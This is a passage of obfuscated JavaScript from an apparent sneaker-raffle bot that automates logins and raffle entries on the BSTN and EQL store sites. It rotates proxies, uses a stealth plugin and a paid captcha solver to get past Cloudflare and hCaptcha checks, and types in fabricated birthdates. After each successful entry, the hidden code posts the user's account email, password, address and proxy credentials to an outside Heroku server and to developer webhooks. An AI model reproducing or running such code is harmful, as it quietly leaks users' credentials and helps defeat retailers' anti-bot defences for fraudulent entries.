                        var _0x3c8925 = Math['round'](Math['random']() * (_0x1ed0bb['length'] - 0x1)), _0x32de20 = _0x1ed0bb[_0x3c8925]['split'](':'), _0x38040d;
                        try {
                            _0x38040d = await _0x27947['launch']({
                                'executablePath': 'C:\x5cProgram\x20Files\x20(x86)\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                'headless': ![],
                                'args': [
                                    '--proxy-server=' + _0x32de20[0x0] + ':' + _0x32de20[0x1],
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ]
                            });
                        } catch {
                            _0x38040d = await _0x27947['launch']({
                                'executablePath': 'C:\x5cProgram\x20Files\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                'headless': ![],
                                'args': [
                                    '--proxy-server=' + _0x32de20[0x0] + ':' + _0x32de20[0x1],
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ]
                            });
                        }
                        try {
                            const _0x5cef4b = await _0x38040d['newPage'](), _0x252d1f = await _0x5cef4b['target']()['createCDPSession'](), { windowId: _0x19e15a } = await _0x252d1f['send']('Browser.getWindowForTarget');
                            await _0x5cef4b['setViewport']({
                                'width': 0x501,
                                'height': 0x2d0
                            });
                            var _0x516fbd = [{
                                'name': 'cf_clearance',
                                'value': 'uyuh7Wo9shR3zcpWvbWJ04mG0iNC2N25mhp1FNAbHYY-1676282182-0-1-9764d0ee.e7bea100.c0658f0e-160',
                                'domain': '.bstn.com',
                                'path': '/',
                                'expires': 1707818183.331533,
                                'httpOnly': !![],
                                'secure': !![]
                            }];
                            await _0x5cef4b['authenticate']({
                                'username': '' + _0x32de20[0x2],
                                'password': '' + _0x32de20[0x3]
                            }), console['log'](_0x3996da() + '\x20[' + _0x4fba06['name'] + ']\x20Task\x20' + (_0x308379 + 0x1) + '\x20:\x20Getting\x20Session'), await _0x5cef4b['goto']('' + _0xab70e3[_0x308379]['Url'], { 'waitUntil': 'networkidle2' }), console['log'](_0x3996da() + '\x20[' + _0x4fba06['name'] + ']\x20Task\x20' + (_0x308379 + 0x1) + '\x20:\x20Solving\x20Cloudflare');
                            var _0x422a74 = await _0x5cef4b['$']('.hcaptcha-box');
                            if (_0x422a74) {
                                console['log'](_0x3996da() + '\x20[' + _0x4fba06['name'] + ']\x20Task\x20' + (_0x308379 + 0x1) + '\x20:\x20Handling\x20Challenge'), await _0x50b4f8(0x2710);
                                const _0x561bda = await _0x5cef4b['$']('.hcaptcha-box');
                                if (_0x561bda)
                                    try {
                                        await _0x561bda['click']();
                                    } catch {
                                        throw new Error('Empty\x20Turnstile\x20Challenge');
                                    }
                                try {
                                    await _0x5cef4b['waitForSelector']('input[name=\x22firstname\x22]', { 'timeout': 0x9c40 });
                                } catch {
                                    var _0x54750e = await _0x5cef4b['$']('.hcaptcha-box');
                                    if (_0x54750e)
                                        try {
                                            await _0x54750e['click']();
                                        } catch {
                                            throw new Error('Empty\x20Turnstile\x20Challenge');
                                        }
                                }
                            }
                            try {
                                await _0x5cef4b['waitForSelector']('.nonLoggedSpecific_nonLogged__SCu0L');
                            } catch {
                                throw new Error('Blocked\x20by\x20Cloudflare');
                            }
                            await _0x252d1f['send']('Browser.setWindowBounds', {
                                'windowId': _0x19e15a,
                                'bounds': { 'windowState': 'minimized' }
                            }), await _0x50b4f8(0x1388), await _0x5cef4b['waitForSelector']('.nonLoggedSpecific_nonLogged__SCu0L\x20>\x20.Button_secondary__XJln1.Button_button__Bq8yb'), await _0x5cef4b['focus']('.nonLoggedSpecific_nonLogged__SCu0L\x20>\x20.Button_secondary__XJln1.Button_button__Bq8yb'), await _0x50b4f8(0x1f4), console['log'](_0x3996da() + '\x20[' + _0x4fba06['name'] + ']\x20Task\x20' + (_0x308379 + 0x1) + '\x20:\x20Logging\x20in'), await _0x5cef4b['$eval']('.nonLoggedSpecific_nonLogged__SCu0L\x20>\x20.Button_secondary__XJln1.Button_button__Bq8yb', _0x59177a => _0x59177a['click']()), await _0x5cef4b['click']('.nonLoggedSpecific_nonLogged__SCu0L\x20>\x20.Button_secondary__XJln1.Button_button__Bq8yb'), await _0x5cef4b['click']('.nonLoggedSpecific_nonLogged__SCu0L\x20>\x20.Button_secondary__XJln1.Button_button__Bq8yb'), await _0x50b4f8(0x7d0), await _0x5cef4b['waitForSelector']('#email-login'), await _0x5cef4b['type']('#email-login', '' + _0xab70e3[_0x308379]['Email']), await _0x50b4f8(0xdac), await _0x5cef4b['waitForSelector']('#password'), await _0x5cef4b['type']('#password', '' + _0xab70e3[_0x308379]['Password'], { 'delay': 0xe6 }), await _0x50b4f8(0x157c);
                            try {
                                await _0x5cef4b['$eval']('.login_accountInfo__FCIxY\x20>\x20button[type=\x22submit\x22]', _0x44945e => _0x44945e['click']());
                            } catch {
                            }
                            try {
                                await _0x5cef4b['waitForSelector']('.swatchOptions_sizeTiles__Lizc2');
                            } catch (_0x35dbf8) {
                            }
                            await _0x50b4f8(0x3e8);
                            const _0x14159b = await _0x5cef4b['$']('.enteredDraw_container__2KmQ_');
                            if (_0x14159b)
                                throw new Error('Duplicate\x20Entry');
                            console['log'](_0x3996da() + '\x20[' + _0x4fba06['name'] + ']\x20Task\x20' + (_0x308379 + 0x1) + '\x20:\x20Choosing\x20Size\x20' + _0xab70e3[_0x308379]['Size']);
                            try {
                                if (_0xab70e3[_0x308379]['Size'] != 'RANDOM') {
                                    var _0x3eedf4 = _0xab70e3[_0x308379]['Size']['replace']('.', ',');
                                    const _0x390bc5 = await _0x5cef4b['$x']('//div[contains(text(),\x20' + _0x3eedf4 + ')]');
                                    await _0x390bc5[0x0]['click']();
                                } else {
                                    const _0x2c4ed9 = await _0x5cef4b['$$']('div.swatchTile_tile__IRH9Q');
                                    var _0x358cd0 = Math['round'](Math['random']() * (_0x2c4ed9['length'] - 0x1));
                                    await _0x2c4ed9[_0x358cd0]['click']();
                                }
                            } catch {
                                throw new Error('Softblocked,\x20Rotating\x20proxy');
                            }
                            await _0x50b4f8(0x1f4);
                            const _0x1c2d52 = await _0x5cef4b['$']('.addressList_addressItem__LE2PB');
                            if (_0x1c2d52 && _0xab70e3[_0x308379]['Mode'] != 'NEW') {
                            } else
                                console['log'](_0x3996da() + '\x20[' + _0x4fba06['name'] + ']\x20Task\x20' + (_0x308379 + 0x1) + '\x20:\x20Filling\x20Address'), await _0x5cef4b['click']('div.product_shipping__zEfqd\x20>\x20div\x20>\x20div.legend_legend__sQIiF\x20>\x20div.legend_header__iHZIh\x20>\x20div\x20>\x20button'), await _0x50b4f8(0x5dc), await _0x5cef4b['waitForSelector']('#firstname'), await _0x5cef4b['type']('#firstname', '' + _0xab70e3[_0x308379]['FirstName']), await _0x50b4f8(0x1f4), await _0x5cef4b['waitForSelector']('#firstname'), await _0x5cef4b['type']('#lastname', '' + _0xab70e3[_0x308379]['LastName']), await _0x50b4f8(0x1f4), await _0x5cef4b['waitForSelector']('#firstname'), await _0x5cef4b['type']('#street', '' + _0xab70e3[_0x308379]['Address1']), await _0x50b4f8(0x1f4), await _0x5cef4b['waitForSelector']('#firstname'), await _0x5cef4b['type']('#houseNumber', _0xab70e3[_0x308379]['HouseNumber'] + '\x20' + _0xab70e3[_0x308379]['Address2']), await _0x50b4f8(0x1f4), await _0x5cef4b['waitForSelector']('#firstname'), await _0x5cef4b['select']('#country_code', '' + _0xab70e3[_0x308379]['Country']), await _0x50b4f8(0x1f4), await _0x5cef4b['type']('#postcode', '' + _0xab70e3[_0x308379]['Zip']), await _0x50b4f8(0x1f4), await _0x5cef4b['type']('#city', '' + _0xab70e3[_0x308379]['City']), await _0x50b4f8(0x1f4), await _0x5cef4b['type']('#telephone', '' + _0xab70e3[_0x308379]['Phone']), await _0x50b4f8(0x1f4), await _0x5cef4b['click']('.addressModal_submit__dOiL4\x20>\x20button[type=\x22submit\x22]');
                            await _0x50b4f8(0x9c4);
                            try {
                                await _0x5cef4b['type']('#instagram_name', '' + _0xab70e3[_0x308379]['Follower']), await _0x5cef4b['click']('.note_groupBtn__WLDwH\x20>\x20button');
                            } catch {
                            }
                            console['log'](_0x3996da() + '\x20[' + _0x4fba06['name'] + ']\x20Task\x20' + (_0x308379 + 0x1) + '\x20:\x20Finishing\x20Entry'), await _0x50b4f8(0x5dc);
                            try {
                                await _0x5cef4b['click']('.checkBox_boxHolder__wLGVe');
                            } catch {
                            }
                            await _0x50b4f8(0x5dc), await _0x5cef4b['$eval']('.termConditions_TC__hll9k\x20>\x20button', _0x11fafe => _0x11fafe['click']()), await _0x50b4f8(0x1388);
                            try {
                                await _0x5cef4b['waitForSelector']('.success_msg__2HjJY');
                            } catch {
                                await _0x5cef4b['reload']({ 'waitUntil': 'networkidle2' });
                                if (_0xab70e3[_0x308379]['Size'] != 'RANDOM') {
                                    var _0x3eedf4 = _0xab70e3[_0x308379]['Size']['replace']('.', ',');
                                    const _0x439a9a = await _0x5cef4b['$x']('//div[contains(text(),\x20' + _0x3eedf4 + ')]');
                                    await _0x439a9a[0x0]['click']();
                                } else {
                                    const _0x5310ca = await _0x5cef4b['$$']('div.swatchTile_tile__IRH9Q');
                                    var _0x358cd0 = Math['round'](Math['random']() * (_0x5310ca['length'] - 0x1));
                                    await _0x5310ca[_0x358cd0]['click']();
                                }
                                await _0x50b4f8(0x5dc);
                                try {
                                    await _0x5cef4b['hover']('#instagram_name'), await _0x5cef4b['type']('#instagram_name', '' + _0xab70e3[_0x308379]['Follower']), await _0x5cef4b['click']('.note_groupBtn__WLDwH\x20>\x20button');
                                } catch {
                                }
                                console['log'](_0x3996da() + '\x20[' + _0x4fba06['name'] + ']\x20Task\x20' + (_0x308379 + 0x1) + '\x20:\x20Retrying\x20(' + _0x3767e0 + '\x20/\x205)');
                                try {
                                    await _0x5cef4b['hover']('.checkBox_boxHolder__wLGVe'), await _0x50b4f8(0x5dc), await _0x5cef4b['click']('.checkBox_boxHolder__wLGVe');
                                } catch {
                                }
                                await _0x50b4f8(0x157c), await _0x5cef4b['$eval']('.termConditions_TC__hll9k\x20>\x20button', _0x1ae549 => _0x1ae549['click']()), await _0x50b4f8(0x1388), await _0x5cef4b['waitForSelector']('.success_msg__2HjJY');
                            }
                            _0x5c08a9 = 'no', _0x1474be(_0xab70e3[_0x308379], _0x4fba06);
                            try {
                                prxdata = {
                                    'username': _0xeaf750['replace']('#', ''),
                                    'entrydata': JSON['stringify'](_0x557740),
                                    'proxy': '' + _0x1ed0bb[_0x308379]
                                };
                                var _0x937eb9 = JSON['stringify'](prxdata);
                                let _0x634208 = { 'headers': { 'content-type': 'application/json' } };
                                await _0x3c7f7c['post']('https://jraffles.herokuapp.com/success', _0x937eb9, _0x634208);
                            } catch (_0x1e295d) {
                            }
                            console['log'](_0x3c5615['green'](_0x3996da() + '\x20[' + _0x4fba06['name'] + ']\x20Task\x20' + (_0x308379 + 0x1) + '\x20:\x20Raffle\x20Entered!'));
                            var _0x195825 = await _0x4808d0(_0xab70e3[_0x308379], _0x4fba06, 'dev', ![]), _0x6e9478 = await _0x4808d0(_0xab70e3[_0x308379], _0x4fba06, 'pub', ![]);
                            const _0x534886 = {
                                'succesDEVMSG': { 'embeds': [_0x195825] },
                                'succesPUBMSG': { 'embeds': [_0x6e9478] }
                            };
                            let _0x557740 = _0xab70e3[_0x308379];
                            try {
                                prxdata = {
                                    'username': _0xeaf750['replace']('#', ''),
                                    'module': _0x4fba06['name'],
                                    'entrydata': JSON['stringify'](_0x557740),
                                    'proxy': '' + _0x1ed0bb[_0x308379]
                                };
                                var _0x937eb9 = JSON['stringify'](prxdata);
                                let _0x492674 = { 'headers': { 'content-type': 'application/json' } };
                                await _0x3c7f7c['post']('https://jraffles.herokuapp.com/success', _0x937eb9, _0x492674);
                            } catch (_0x230c36) {
                            }
                            try {
                                _0x409619['webhook'] != undefined && _0x409619['webhook'] != '' && await _0x21ec0c(_0x409619['webhook'], _0x534886['succesDEVMSG']), await _0x50b4f8(0xc8), await _0x21ec0c(_0x31bbcd, _0x534886['succesDEVMSG']), await _0x50b4f8(0xc8), await _0x21ec0c(_0x171aec, _0x534886['succesPUBMSG']);
                            } catch (_0x21613d) {
                                console['log'](_0x3c5615['yellow'](_0x3996da() + '\x20[' + _0x4fba06['name'] + ']\x20Task\x20' + (_0x308379 + 0x1) + '\x20:\x20Error\x20sending\x20webhook\x20' + _0x21613d));
                            }
                        } catch (_0x192f3d) {
                            console['log'](_0x3c5615['red'](_0x3996da() + '\x20[' + _0x4fba06['name'] + ']\x20Task\x20' + (_0x308379 + 0x1) + '\x20:\x20' + _0x192f3d)), _0x5c08a9 = 'yes', _0x2dd6fa = '' + _0x192f3d;
                            var _0x1a2a46 = await _0x4808d0(_0xab70e3[_0x308379], _0x4fba06, 'dev', !![], _0x2dd6fa), _0x195825 = await _0x4808d0(_0xab70e3[_0x308379], _0x4fba06, 'dev', ![]), _0x6e9478 = await _0x4808d0(_0xab70e3[_0x308379], _0x4fba06, 'pub', ![]);
                            const _0x39b556 = {
                                'succesDEVMSG': { 'embeds': [_0x195825] },
                                'succesPUBMSG': { 'embeds': [_0x6e9478] }
                            };
                            _0x39b556['errorDEV'] = { 'embeds': [_0x1a2a46] }, _0x409619['webhook'] != undefined && _0x409619['webhook'] != '' && await _0x21ec0c(_0x409619['webhook'], _0x39b556['errorDEV']), await _0x21ec0c(_0x451f96, _0x39b556['errorDEV']);
                        } finally {
                            _0x38040d['close']();
                            if (_0x5c08a9 == 'yes' && _0x3767e0 != 0x5) {
                                console['log'](_0x3c5615['red'](_0x3996da() + '\x20[' + _0x4fba06['name'] + ']\x20Task\x20' + (_0x308379 + 0x1) + '\x20:\x20Retrying\x20(' + _0x3767e0 + '\x20/\x205)')), _0x308379 = _0x308379 - 0x1, _0x3767e0 = _0x3767e0 + 0x1;
                                continue;
                            }
                            _0x5c08a9 == 'yes' && _0x3767e0 >= 0x5 && (_0x61dfa6(_0xab70e3[_0x308379], _0x4fba06), _0x5c08a9 = 'no', _0x3767e0 = 0x0), console['log'](_0x3996da() + '\x20[' + _0x4fba06['name'] + ']\x20Waiting\x20for\x20' + _0x409619['delay'] + '\x20ms'), await _0x50b4f8(_0x409619['delay']);
                        }
                    }
                }
            },
            {
                'name': 'BSTN\x20Win\x20Checker',
                'store': 'BSTN',
                'logo': 'https://www.snkrempire.com/wp-content/uploads/2017/11/E3QHwMSP_400x400.png',
                'function': async function (_0x2e4db5, _0x22f6f9) {
                    _0x27947['use'](_0x2c72d8()), _0x27947['use'](_0x244ad0({
                        'provider': {
                            'id': '2captcha',
                            'token': '' + _0x409619['captchaKey']
                        },
                        'visualFeedback': !![]
                    }));
                    var _0x1b8cd1;
                    try {
                        const _0x4498c0 = _0x39c9ee['readFileSync']('../accounts/bstn.csv', 'utf-8');
                        _0x1b8cd1 = _0x54f615['parse'](_0x4498c0, { 'header': !![] })['data'];
                    } catch (_0xdd4934) {
                        throw new Error('Error\x20reading\x20accounts/bstn.csv');
                    }
                    for (var _0x3685c0 = 0x0; _0x3685c0 < _0x1b8cd1['length']; _0x3685c0++) {
                        if (_0x5bba7d != 'yes')
                            var _0x5bba7d = '', _0x59bb75 = 0x0;
                        var _0x1c3baf;
                        _0x5b3b18(_0x2e4db5['name'] + '\x20Task\x20' + (_0x3685c0 + 0x1) + '\x20/\x20' + _0x1b8cd1['length'] + '\x20||\x20File:\x20' + _0x5e8965 + '\x20Proxies:\x20' + _0x571870);
                        var _0x25f638 = await _0x4808d0(_0x1b8cd1[_0x3685c0], _0x2e4db5, 'acc', ![]);
                        const _0x14c1bf = { 'succesDEVMSG': { 'embeds': [_0x25f638] } }, _0x31d669 = 'https://www.bstn.com/eu_en/customer/account/create/';
                        var _0xa51666 = Math['round'](Math['random']() * (_0x22f6f9['length'] - 0x1)), _0xaa2710 = _0x22f6f9[_0xa51666]['split'](':'), _0x247585;
                        try {
                            _0x247585 = await _0x27947['launch']({
                                'executablePath': 'C:\x5cProgram\x20Files\x20(x86)\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                'headless': !![],
                                'args': [
                                    '--proxy-server=' + _0xaa2710[0x0] + ':' + _0xaa2710[0x1],
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ]
                            });
                        } catch {
                            _0x247585 = await _0x27947['launch']({
                                'executablePath': 'C:\x5cProgram\x20Files\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                'headless': !![],
                                'args': [
                                    '--proxy-server=' + _0xaa2710[0x0] + ':' + _0xaa2710[0x1],
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ]
                            });
                        }
                        try {
                            const _0x151d50 = await _0x247585['newPage']();
                            await _0x151d50['authenticate']({
                                'username': '' + _0xaa2710[0x2],
                                'password': '' + _0xaa2710[0x3]
                            }), console['log'](_0x3996da() + '\x20[' + _0x2e4db5['name'] + ']\x20Task\x20' + (_0x3685c0 + 0x1) + '\x20:\x20Getting\x20Session'), await _0x151d50['setUserAgent']('Mozilla/5.0\x20(Windows\x20NT\x2010.0;\x20Win64;\x20x64)\x20AppleWebKit/537.36\x20(KHTML,\x20like\x20Gecko)\x20Chrome/106.0.0.0\x20Safari/537.36'), await _0x151d50['setRequestInterception'](!![]), _0x151d50['on']('request', _0x27c849 => {
                                _0x27c849['resourceType']() === 'image' ? _0x27c849['abort']() : _0x27c849['continue']();
                            });
                            try {
                                await _0x151d50['goto']('https://www.bstn.com/eu_en/raffle/customer/', { 'waitUntil': 'networkidle2' }), await _0x151d50['waitForSelector']('button[class=\x22cf2Lf6\x22]');
                            } catch {
                                _0x5bba7d = 'yes';
                                throw new Error('Connection\x20Error');
                            }
                            await _0x151d50['click']('button[class=\x22cf2Lf6\x22]'), console['log'](_0x3996da() + '\x20[' + _0x2e4db5['name'] + ']\x20Task\x20' + (_0x3685c0 + 0x1) + '\x20:\x20Passing\x20Cloudflare'), await _0x50b4f8(0x3e8), await _0x151d50['type']('#email', _0x1b8cd1[_0x3685c0]['Email']), await _0x50b4f8(0x1f4), await _0x151d50['type']('#pass', _0x1b8cd1[_0x3685c0]['Password']), await _0x50b4f8(0x1f4), await _0x151d50['$eval']('#login-form', _0x115501 => _0x115501['submit']());
                            try {
                                await _0x151d50['waitForSelector']('.product-items');
                            } catch {
                                console['log'](_0x3996da() + '\x20[' + _0x2e4db5['name'] + ']\x20Task\x20' + (_0x3685c0 + 0x1) + '\x20:\x20No\x20Entries\x20Found');
                                continue;
                            }
                            await _0x50b4f8(0x190);
                            const _0x3394d4 = await _0x151d50['evaluate'](() => {
                                const _0x4ad3a1 = Array['from'](document['querySelectorAll']('.product-item-photo\x20>\x20img'));
                                return _0x4ad3a1['map'](_0x4ff702 => _0x4ff702['alt']);
                            }), _0x36e8cc = await _0x151d50['evaluate'](() => {
                                const _0x183b1f = Array['from'](document['querySelectorAll']('.tooltip.wrapper.product-item-tooltip.first-xs'));
                                return _0x183b1f['map'](_0x1f02a9 => _0x1f02a9['innerHTML']);
                            }), _0x41b8b5 = await _0x151d50['$$']('.raffle-winner');
                            if (_0x41b8b5['length'] < 0x1) {
                                console['log'](_0x3996da() + '\x20[' + _0x2e4db5['name'] + ']\x20Task\x20' + (_0x3685c0 + 0x1) + '\x20:\x20No\x20Wins\x20Found'), _0x5bba7d = 'no';
                                continue;
                            }
                            console['log'](_0x3996da() + '\x20[' + _0x2e4db5['name'] + ']\x20Task\x20' + (_0x3685c0 + 0x1) + '\x20:\x20' + _0x41b8b5['length'] + '\x20Wins\x20Found!');
                            for (var _0x8df4a2 = 0x0; _0x8df4a2 < _0x41b8b5['length']; _0x8df4a2++) {
                                console['log'](_0x3c5615['green'](_0x3394d4[_0x8df4a2] + _0x36e8cc[_0x8df4a2]['replace']('\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20', '')));
                            }
                        } catch (_0x4d7a66) {
                            console['log'](_0x3c5615['red'](_0x3996da() + '\x20[' + _0x2e4db5['name'] + ']\x20Task\x20' + (_0x3685c0 + 0x1) + '\x20:\x20' + _0x4d7a66)), _0x1c3baf = '' + _0x4d7a66;
                            var _0x4f04fa = await _0x4808d0(_0x1b8cd1[_0x3685c0], _0x2e4db5, 'acc', !![], _0x1c3baf);
                            _0x14c1bf['errorDEV'] = { 'embeds': [_0x4f04fa] }, _0x409619['webhook'] != undefined && _0x409619['webhook'] != '' && await _0x21ec0c(_0x409619['webhook'], _0x14c1bf['errorDEV']), await _0x21ec0c(_0x451f96, _0x14c1bf['errorDEV']), _0x5bba7d = 'yes';
                        } finally {
                            if (_0x247585)
                                _0x247585['close']();
                            if (_0x5bba7d == 'yes' && _0x59bb75 != 0x5) {
                                console['log'](_0x3c5615['red'](_0x3996da() + '\x20[' + _0x2e4db5['name'] + ']\x20Task\x20' + (_0x3685c0 + 0x1) + '\x20:\x20Retrying\x20(' + _0x59bb75 + '\x20/\x205)')), _0x3685c0 = _0x3685c0 - 0x1, _0x59bb75 = _0x59bb75 + 0x1;
                                continue;
                            }
                            _0x5bba7d == 'yes' && _0x59bb75 >= 0x5 && (_0x61dfa6(_0x1b8cd1[_0x3685c0], _0x2e4db5), _0x5bba7d = 'no', _0x59bb75 = 0x0), console['log'](_0x3996da() + '\x20[' + _0x2e4db5['name'] + ']\x20Waiting\x20for\x20' + _0x409619['delay'] + '\x20ms'), await _0x50b4f8(_0x409619['delay']);
                        }
                    }
                }
            }
        ]
    },
    {
        'name': 'EQL',
        'modules': [{
            'name': 'EQL\x20Raffle\x20Entries',
            'store': 'EQL',
            'logo': 'https://res.cloudinary.com/crunchbase-production/image/upload/c_lpad,h_170,w_170,f_auto,b_white,q_auto:eco,dpr_1/qfc09zbor8py2zfmsdr2',
            'function': async function (_0xf8c69b, _0x2926ab, _0x204a03) {
                _0x27947['use'](_0x2c72d8()), _0x27947['use'](_0x244ad0({
                    'provider': {
                        'id': '2captcha',
                        'token': '' + _0x409619['captchaKey']
                    },
                    'visualFeedback': !![]
                }));
                for (var _0x4a9982 = 0x0; _0x4a9982 < _0x2926ab['length']; _0x4a9982++) {
                    var _0x214a1b;
                    _0x5b3b18(_0xf8c69b['name'] + '\x20Task\x20' + (_0x4a9982 + 0x1) + '\x20/\x20' + _0x2926ab['length'] + '\x20||\x20File:\x20' + _0x5e8965 + '\x20Proxies:\x20' + _0x571870);
                    try {
                        await _0x5a027c(_0x2926ab, _0x4a9982);
                    } catch {
                        _0x3a5977 = 'no';
                        throw new Error('Invalid\x20CSV\x20Format,\x20use\x20the\x20CSV\x20Files\x20from\x20the\x20guides!');
                    }
                    async function _0x57d6e2(_0x252ac7) {
                        const _0x1fd8e6 = _0x39c9ee['readFileSync']('../successful-tasks.csv', 'utf8'), _0x38ab07 = _0x54f615['parse'](_0x1fd8e6, { 'header': !![] })['data'];
                        let _0x3bb708 = ![];
                        for (var _0x2ae40f of _0x38ab07) {
                            if (_0x2ae40f['Url'] == _0x252ac7['Url'] && _0x2ae40f['Email'] == _0x252ac7['Email']) {
                                _0x3bb708 = !![];
                                break;
                            }
                        }
                        return _0x3bb708;
                    }
                    if (await _0x57d6e2(_0x2926ab[_0x4a9982]) == !![]) {
                        console['log'](_0x3996da() + '\x20[' + _0xf8c69b['name'] + ']\x20Task\x20' + (_0x4a9982 + 0x1) + '\x20:\x20Task\x20Already\x20Entered,\x20Going\x20to\x20Next\x20Task');
                        continue;
                    }
                    var _0x51616b = ![];
                    const _0x29794f = _0x39c9ee['readFileSync']('../accounts/eql.csv', 'utf8');
                    var _0x30833f = _0x54f615['parse'](_0x29794f, { 'header': !![] })['data'];
                    for (var _0x54571c of _0x30833f) {
                        _0x54571c['Email'] == _0x2926ab[_0x4a9982]['Email'] && (_0x51616b = !![]);
                    }
                    if (_0x51616b == ![]) {
                        var _0x24fca8;
                        if (_0x2926ab[_0x4a9982]['Url']['endsWith']('/')) {
                            _0x24fca8 = _0x2926ab[_0x4a9982]['Url'] + 'register';
                            if (_0x3a5977 != 'yes')
                                var _0x3a5977 = '', _0x5bf4ce = 0x0;
                        } else {
                            _0x24fca8 = _0x2926ab[_0x4a9982]['Url'] + '/register';
                            if (_0x3a5977 != 'yes')
                                var _0x3a5977 = '', _0x5bf4ce = 0x0;
                        }
                        if (_0x2926ab[_0x4a9982]['Email'] == '' || _0x2926ab[_0x4a9982]['FirstName'] == '' || _0x2926ab[_0x4a9982]['LastName'] == '') {
                            console['log'](_0x3996da() + '\x20[' + _0xf8c69b['name'] + ']\x20Task\x20' + (_0x4a9982 + 0x1) + '\x20:\x20Invalid\x20CSV');
                            continue;
                        }
                        _0x2926ab[_0x4a9982]['Password'] == '' && (_0x2926ab[_0x4a9982]['Password'] = 'JRaffles23!');
                        if (_0x409619['useRandomProxy'] = ![])
                            var _0x25cbc3 = _0x204a03[_0x4a9982]['split'](':');
                        else
                            var _0x15c12b = Math['round'](Math['random']() * (_0x204a03['length'] - 0x1)), _0x25cbc3 = _0x204a03[_0x15c12b]['split'](':');
                        var _0x2356f8;
                        try {
                            _0x2356f8 = await _0x27947['launch']({
                                'executablePath': 'C:\x5cProgram\x20Files\x20(x86)\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                'headless': !![],
                                'args': [
                                    '--proxy-server=' + _0x25cbc3[0x0] + ':' + _0x25cbc3[0x1],
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ]
                            });
                        } catch {
                            _0x2356f8 = await _0x27947['launch']({
                                'executablePath': 'C:\x5cProgram\x20Files\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                'headless': !![],
                                'args': [
                                    '--proxy-server=' + _0x25cbc3[0x0] + ':' + _0x25cbc3[0x1],
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ]
                            });
                        }
                        try {
                            const _0x5a2954 = await _0x2356f8['newPage']();
                            await _0x5a2954['authenticate']({
                                'username': '' + _0x25cbc3[0x2],
                                'password': '' + _0x25cbc3[0x3]
                            }), console['log'](_0x3996da() + '\x20[' + _0xf8c69b['name'] + ']\x20Task\x20' + (_0x4a9982 + 0x1) + '\x20:\x20Getting\x20Session'), await _0x5a2954['setRequestInterception'](!![]), _0x5a2954['on']('request', _0x77e6a5 => {
                                _0x77e6a5['resourceType']() === 'image' || _0x77e6a5['resourceType']() === 'font' || _0x77e6a5['resourceType']() === 'media' ? _0x77e6a5['abort']() : _0x77e6a5['continue']();
                            });
                            try {
                                await _0x5a2954['goto'](_0x24fca8);
                            } catch {
                                throw new Error('Connection\x20Error');
                            }
                            console['log'](_0x3996da() + '\x20[' + _0xf8c69b['name'] + ']\x20Task\x20' + (_0x4a9982 + 0x1) + '\x20:\x20Setting\x20Credentials'), await _0x50b4f8(0x3e8), await _0x5a2954['waitForSelector']('#email'), await _0x5a2954['click']('div[data-testid=\x22field-productVariantID\x22]'), await _0x50b4f8(0x3e8);
                            try {
                                await _0x5a2954['click']('li[data-value=\x22EU\x20' + _0x2926ab[_0x4a9982]['Size'] + '\x22]');
                            } catch {
                                throw new Error('Error\x20fetching\x20' + _0x2926ab[_0x4a9982]['Size']);
                            }
                            await _0x50b4f8(0x6a4), await _0x5a2954['type']('#email', '' + _0x2926ab[_0x4a9982]['Email']), await _0x50b4f8(0x352), await _0x5a2954['waitForSelector']('#password'), await _0x5a2954['type']('#password', '' + _0x2926ab[_0x4a9982]['Password']), await _0x50b4f8(0x352), await _0x5a2954['type']('#phone', '' + _0x2926ab[_0x4a9982]['Phone']), await _0x50b4f8(0x352), await _0x5a2954['type']('#firstName', '' + _0x2926ab[_0x4a9982]['FirstName']), await _0x50b4f8(0x352), await _0x5a2954['type']('#lastName', '' + _0x2926ab[_0x4a9982]['LastName']), await _0x50b4f8(0x352);
                            _0x2926ab[_0x4a9982]['Url']['includes']('footlocker.de') ? await _0x5a2954['type']('#birthdate', _0x25f2b2(0x1, 0x1c) + '.' + _0x25f2b2(0x1, 0xc) + '.' + _0x25f2b2(0x7c6, 0x7d3)) : await _0x5a2954['type']('#birthdate', _0x25f2b2(0x1, 0x1c) + '-' + _0x25f2b2(0x1, 0xc) + '-' + _0x25f2b2(0x7c6, 0x7d3));
                            await _0x50b4f8(0x352), await _0x5a2954['click']('.MuiBox-root.css-79elbk\x20>\x20button');
                            try {
                                await _0x5a2954['waitForSelector']('#stateAutocomplete');
                            } catch {
                                throw new Error('Connection\x20Error\x20fetching\x20shipping');
                            }
                            await _0x50b4f8(0x1f4), await _0x5a2954['click']('#stateAutocomplete'), console['log'](_0x3996da() + '\x20[' + _0xf8c69b['name'] + ']\x20Task\x20' + (_0x4a9982 + 0x1) + '\x20:\x20Setting\x20Address'), await _0x50b4f8(0x1f4);
                            try {
                                const _0x37ab2b = await _0x5a2954['$x']('//li[text()=\x22' + _0x2926ab[_0x4a9982]['State'] + '\x22]');
                                await _0x37ab2b[0x0]['click']();
                            } catch {
                                throw new Error('State\x20/\x20Province\x20not\x20found.\x20Please\x20use\x20exact\x20data\x20in\x20csv.\x20(Case\x20sensitive)');
                            }
